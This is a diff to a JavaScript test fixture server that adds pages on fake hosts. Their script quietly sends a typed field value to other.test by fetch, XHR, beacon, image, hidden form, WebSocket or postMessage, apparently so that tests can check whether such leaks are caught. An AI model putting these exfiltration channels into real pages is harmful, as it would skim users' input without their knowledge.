@@ -94,6 +94,45 @@ const LEAVE = {
 <iframe id="away" src="https://other.test:${port}/?from=frame" width="300" height="100"></iframe>`),
 };
 
+/**
+ * Pages of the run's sites whose own script sends what is typed in their field to other.test by a request of the page's own, not
+ * by a navigation: once the field has a value (the taf's fill), `via` sends it once, as `?leak=<value>&via=<via>`. A test reads
+ * other.test's log for the value (`hits`, and the WebSocket upgrades in it).
+ */
+export const LEAK_VIAS = ["fetch", "xhr", "beacon", "img", "form-iframe", "websocket", "postmessage"];
+const LEAK = (port, via) => {
+  const away = `https://other.test:${port}`;
+  const send = {
+    fetch: `fetch("${away}/collect?" + q, { mode: "no-cors" }).catch(() => {});`,
+    xhr: `const x = new XMLHttpRequest(); x.open("GET", "${away}/collect?" + q); x.send();`,
+    beacon: `navigator.sendBeacon("${away}/collect?" + q, "");`,
+    img: `new Image().src = "${away}/collect?" + q;`,
+    // A GET form's own fields make its query (the action's is dropped): the value and the way go as fields.
+    "form-iframe": `const f = document.getElementById("quiet"); f.action = "${away}/collect"; f.elements.leak.value = v; f.submit();`,
+    websocket: `try { new WebSocket("wss://other.test:${port}/ws?" + q); } catch {}`,
+    postmessage: `document.getElementById("sink").contentWindow.postMessage(v, "*");`,
+  }[via];
+  const extra = via === "form-iframe"
+    ? `<iframe name="quietframe" width="10" height="10"></iframe><form id="quiet" method="get" target="quietframe"><input type="hidden" name="leak"><input type="hidden" name="via" value="form-iframe"></form>`
+    : via === "postmessage" ? `<iframe id="sink" src="${away}/sink" width="10" height="10"></iframe>` : "";
+  return page("A note", `<h1>A note</h1>
+<label for="note">Your note</label><input id="note" type="text">
+${extra}
+<script>
+let sent = false;
+setInterval(() => {
+  const v = document.getElementById("note").value;
+  if (!v || sent) return;
+  sent = true;
+  const q = "leak=" + encodeURIComponent(v) + "&via=${via}";
+  ${send}
+}, 100);
+</script>`);
+};
+
+/** other.test's frame that a page of the run's sites posts a message to: it sends what it's given home, by a fetch of its own. */
+const SINK = page("Sink", `<p>sink</p><script>addEventListener("message", (e) => { fetch("/collect?leak=" + encodeURIComponent(String(e.data)) + "&via=postmessage-frame").catch(() => {}); });</script>`);
+
 const FRAMES = (port) => page("Frames", `<h1>Frames</h1>
 <p>The page around the frames.</p>
 <iframe id="same" src="/inner" width="400" height="160"></iframe>
@@ -112,6 +151,11 @@ export class FixtureSites {
     this.posts = []; // every POST, as "host path?query"
     this.hosts = new Map(); // a host answered by a test's own handler (serve)
     this.server = createServer({ key: readFileSync(key), cert: readFileSync(cert) }, (req, res) => this.answer(req, res));
+    // A WebSocket's opening request is logged as any request is, then refused: what it asked for is all a test needs.
+    this.server.on("upgrade", (req, socket) => {
+      this.hits.push(String(req.headers.host || "").replace(/:\d+$/, "") + " " + req.url);
+      socket.destroy();
+    });
     await new Promise((resolve) => this.server.listen(0, "127.0.0.1", resolve));
     this.port = this.server.address().port;
     return this;
@@ -143,8 +187,9 @@ export class FixtureSites {
       "shop.test": {
         "/form": FORM, "/confirm": CONFIRM, "/account": ACCOUNT, "/links": LINKS(this.port), "/frames": FRAMES(this.port), "/inner": INNER(FRAME_PASSWORD),
         ...Object.fromEntries(Object.entries(LEAVE).map(([name, make]) => ["/leave-" + name, make(this.port)])),
+        ...Object.fromEntries(LEAK_VIAS.map((via) => ["/leak-" + via, LEAK(this.port, via)])),
       },
-      "other.test": { "/": OTHER, "/collect": OTHER, "/account": ACCOUNT },
+      "other.test": { "/": OTHER, "/collect": OTHER, "/account": ACCOUNT, "/sink": SINK },
     };
     const body = (pages[host] || {})[path];
     if (!body) {
